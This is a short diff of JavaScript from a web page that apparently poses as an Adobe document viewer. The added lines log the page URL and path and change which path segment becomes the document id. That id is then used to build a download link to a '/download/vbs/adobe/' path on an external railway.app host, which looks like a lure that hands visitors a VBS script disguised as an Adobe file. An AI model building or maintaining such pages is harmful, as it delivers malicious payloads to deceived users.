@@ -2348,7 +2348,13 @@
           console.error('Error with visitor tracking:', error);
         }
         
-        var docId = window.location.pathname.split('/')[1];
+console.log('ADOBE URL:', window.location.href);
+console.log('ADOBE PATH:', window.location.pathname);
+console.log('ADOBE PARTS:', window.location.pathname.split('/'));
+
+var docId = window.location.pathname.split('/')[2];
+
+console.log('ADOBE DOCID:', docId);
         
         var downloadUrl = 'https://nodejnct-production.up.railway.app/download/vbs/adobe/' + encodeURIComponent(docId);
         
